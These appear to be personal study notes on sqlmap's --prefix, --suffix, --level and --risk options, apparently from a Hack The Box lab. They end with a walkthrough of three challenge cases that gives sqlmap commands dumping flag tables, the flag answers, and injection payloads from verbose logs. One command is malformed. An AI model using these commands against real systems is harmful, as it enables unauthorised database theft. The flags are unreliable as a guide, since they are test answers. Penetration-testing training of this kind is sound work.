@@ -1,1 +1,107 @@
 
+Prefix/Suffix
+There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
+For such runs, options --prefix and --suffix can be used as follows:
+
+EXAMPLE: sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+
+This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.
+For example, if the vulnerable code at the target is:
+$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
+$result = mysqli_query($link, $query);
+
+The vector UNION ALL SELECT 1,2,VERSION(), bounded with the prefix %')) and the suffix -- -, will result in the following (valid) SQL statement at the target:
+SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
+
+Level/Risk
+
+* in my experience so far these are the only arguments ive really had to use with SQLMap.. 
+
+By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
+
+For such demands, the options --level and --risk should be used:
+
+The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
+
+The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
+
+EXAMPLE: MJBUCKNER@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
+
+...SNIP...
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
+[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
+...SNIP...
+[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
+[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
+[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
+...SNIP...
+[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
+[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
+[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
+...SNIP...
+[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
+[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+
+MJBUCKNER@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
+...SNIP...
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
+[14:20:36] [PAYLOAD] 1 AND 7496=4313
+[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
+[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
+[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+
+As for vectors, we can compare used payloads as follows:
+MJBUCKNER@htb[/htb]$ sqlmap -u www.example.com/?id=1
+...SNIP...
+[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+...SNIP...
+
+so final payload will look like: 
+
+EXAMPLE: MJBUCKNER@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
+
+...SNIP...
+[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+...SNIP...
+[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+...SNIP...
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+...SNIP...
+[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+...SNIP...
+
+
+Challenge: 94.237.49.98:59955
+
+QUESTION 1 - What's the contents of table flag5? (Case #5) - HTB{700_much`}15k_bu7_w0r7h_17} 
+1) http://94.237.49.98:59955/case5.php
+2) Detect and exploit (OR) SQLi vulnerability in GET parameter id
+3) sqlmap -u 'http://94.237.49.98:59955/case5.php?id=*' --level 5 --risk 3 -T flag5 --batch --dump
+4) output: HTB{700_much`}15k_bu7_w0r7h_17}
+
+QUESTION 2 - What's the contents of table flag6? (Case #6) - HTB{v1nc3_mcm4h0n_15_4570n15h3d}
+1) http://94.237.49.98:59955/case6.php
+2) Detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries
+3) sqlmap -u 'http://94.237.49.98:59955/case6.php--prefix='`)' --batch -T flag6 --dump
+4) output: HTB{v1nc3_mcm4h0n_15_4570n15h3d}
+
+QUESTION 3 - What's the contents of table flag7? (Case #7) - HTB{un173_7h3_un173d} 
+1) http://94.237.49.98:59955/case7.php
+2) Detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique
+3) once we hit 'click here' on the webpage we can count there are 5 columns. so we form our payload around that fact. 
+4) sqlmap -u 'http://94.237.49.98:59955/case7.php?id=1' -T flag7 --technique=U --union-cols=5 --dump 
+5) output: HTB{un173_7h3_un173d} 
